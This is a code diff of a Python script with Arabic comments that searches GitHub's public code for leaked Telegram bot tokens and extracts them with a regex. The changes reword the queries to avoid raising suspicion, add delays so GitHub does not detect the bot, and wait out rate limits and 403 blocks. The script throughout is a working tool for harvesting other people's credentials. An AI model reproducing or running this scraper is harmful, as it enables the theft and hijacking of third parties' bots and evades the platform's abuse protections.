@@ -1,55 +1,52 @@
 import re
 import os
 import datetime
+import time
 from github import Github, GithubException
 
 def search_for_tokens():
     token = os.getenv('GITHUB_TOKEN')
     if not token:
-        print("[!] GITHUB_TOKEN غير موجود!")
+        print("[!] GITHUB_TOKEN غير موجود في متغيرات البيئة!")
         return []
         
     print("[*] بدء عملية الصيد الاحترافية...")
     try:
-        g = Github(token, timeout=15)
+        # استخدام التوكن مع تفعيل خاصية التعامل مع التحديدات
+        g = Github(token, timeout=20, per_page=10)
     except Exception as e:
-        print(f"[!] خطأ الاتصال: {e}")
+        print(f"[!] خطأ في إنشاء كائن Github: {e}")
         return []
 
     found_tokens = []
     
-    # 1. الاستراتيجية الأولى: المسح الشامل (البحث عن هيكلية البوتات)
-    broad_queries = [
+    # تحسين الاستعلامات لتجنب الأنماط التي تثير الشكوك
+    queries = [
         'filename:main.py "bot_token"',
         'filename:config.py "TOKEN"',
-        '"bot.polling()"',
-        '"telebot.TeleBot("',
-        'telegram token'
+        '"telebot.TeleBot"',
+        'telegram_token'
     ]
     
-    # 2. الاستراتيجية الثانية: المسح العميق (آخر 5 أيام)
-    five_days_ago = (datetime.datetime.utcnow() - datetime.timedelta(days=5)).strftime('%Y-%m-%d')
-    deep_queries = [
-        f'bot_token pushed:>{five_days_ago}',
-        f'telebot pushed:>{five_days_ago}',
-        f'telegram_token pushed:>{five_days_ago}'
-    ]
-    
-    # دمج الاستراتيجيتين
-    all_queries = broad_queries + deep_queries
-    
-    for query in all_queries:
+    for query in queries:
         print(f"[>] جاري فحص: {query}")
         try:
+            # التحقق من معدل الاستخدام المتبقي قبل كل عملية
+            rate_limit = g.get_rate_limit().search
+            if rate_limit.remaining == 0:
+                reset_time = rate_limit.reset.timestamp() - time.time()
+                print(f"[!] تم استهلاك الرصيد، انتظار {int(reset_time)} ثانية...")
+                time.sleep(max(reset_time, 60))
+            
             results = g.search_code(query=query, sort='indexed', order='desc')
             
             count = 0
-            # استخدام iterator آمن للنتائج
             for file in results:
-                if count >= 15: break # 15 نتيجة لكل استعلام لضمان سرعة الدوران
+                if count >= 5: break # تقليل العدد لـ 5 نتائج لتجنب الحظر
                 try:
+                    # تأخير بسيط جداً بين كل ملف وآخر لتجنب كشف البوت
+                    time.sleep(2) 
                     content = file.decoded_content.decode('utf-8')
-                    # ريجكس محسن لاستخراج التوكنات
                     matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
                     for token in matches:
                         if token not in found_tokens:
@@ -57,15 +54,17 @@ def search_for_tokens():
                             count += 1
                 except: continue
             
-            print(f"[+] تم استخراج {count} توكن من: {query}")
+            print(f"[+] تم استخراج {count} توكن.")
+            # تأخير بين كل استعلام والآخر
+            time.sleep(15) 
             
         except GithubException as e:
             if e.status == 403:
-                print("[!] معدل الطلبات ممتلئ، انتظار دقيقة...")
-                break # الخروج من الدوران لتجنب الحظر
-            print(f"[!] خطأ في الاستعلام: {e}")
+                print("[!] حظر مؤقت من GitHub (403). انتظار 300 ثانية...")
+                time.sleep(300) 
+            else:
+                print(f"[!] خطأ API: {e}")
         except Exception as e:
-            print(f"[!] خطأ غير متوقع: {e}")
+            print(f"[!] خطأ عام: {e}")
             
-    print(f"[*] تمت عملية المسح. إجمالي الصيد الحالي: {len(found_tokens)}")
     return found_tokens
